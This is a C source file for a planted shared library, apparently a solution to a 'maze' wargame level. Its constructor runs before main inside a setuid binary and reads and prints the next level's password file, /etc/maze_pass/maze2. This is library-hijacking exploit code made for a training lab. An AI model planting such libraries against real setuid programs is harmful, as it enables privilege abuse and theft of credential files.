#include <stdio.h>
#include <unistd.h>
/* libc.so.4 - the planted library: a constructor runs at load time
   (before main) with the setuid binary's fsuid (maze2), so it can
   read /etc/maze_pass/maze2 and print it. */
__attribute__((constructor))
static void init(void) {
    char b[256];
    FILE *f = fopen("/etc/maze_pass/maze2", "r");
    if (!f) return;
    size_t n = fread(b, 1, sizeof b - 1, f);
    fclose(f);
    b[n] = 0;
    write(1, b, n);
}
int _dummy;
